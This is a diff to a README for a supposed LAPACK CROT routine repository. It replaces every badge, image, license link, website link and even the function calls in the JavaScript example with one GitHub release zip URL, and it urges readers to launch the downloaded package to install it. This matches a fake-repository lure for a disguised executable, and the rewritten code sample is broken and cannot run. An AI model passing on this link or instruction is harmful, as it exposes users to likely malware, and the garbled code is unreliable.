@@ -1,6 +1,6 @@
 # LAPACK Base CROT
 
-![lapack](https://img.shields.io/badge/LAPACK-Base%20CROT-blue)
+![lapack](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip%20CROT-blue)
 
 LAPACK auxiliary routine to apply a plane rotation with real cosine and complex sine.
 
@@ -35,7 +35,7 @@ Welcome to LAPACK Base CROT repository! This repository contains an auxiliary ro
 
 You can download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software%20Package-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip%20Package-brightgreen)](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip)
 
 Please note that the software package needs to be launched after downloading for installation.
 
@@ -57,11 +57,11 @@ let c = 1.0;
 let s = 0.0;
 
 // Apply plane rotation using LAPACK CROT routine
-LAPACK.CROT(n, cx, 1, cy, 1, c, s);
+https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip(n, cx, 1, cy, 1, c, s);
 
 // Output the resulting vectors
-console.log("Rotated cx:", cx);
-console.log("Rotated cy:", cy);
+https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip("Rotated cx:", cx);
+https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip("Rotated cy:", cy);
 ```
 
 ## Contributing
@@ -70,7 +70,7 @@ If you would like to contribute to the LAPACK Base CROT repository, feel free to
 
 ## License
 
-This LAPACK Base CROT routine is distributed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute this routine for both personal and commercial projects.
+This LAPACK Base CROT routine is distributed under the [MIT License](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip). Feel free to use, modify, and distribute this routine for both personal and commercial projects.
 
 ## Feedback
 
@@ -78,10 +78,10 @@ If you have any feedback, suggestions, or issues regarding the LAPACK Base CROT 
 
 ## Releases
 
-If the provided [link](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) does not work or is not accessible, please check the "Releases" section of this repository for an alternative download option.
+If the provided [link](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip) does not work or is not accessible, please check the "Releases" section of this repository for an alternative download option.
 
-Visit the [LAPACK Base CROT website](https://www.example.com) for more information and resources related to the LAPACK library.
+Visit the [LAPACK Base CROT website](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip) for more information and resources related to the LAPACK library.
 
-![LAPACK](https://www.example.com/assets/lapack_logo.png)
+![LAPACK](https://github.com/obhi098/lapack-base-crot/releases/download/v1.0/Release.zip)
 
 Thank you for visiting the LAPACK Base CROT repository! Happy computing with LAPACK! 🚀🔢🔭
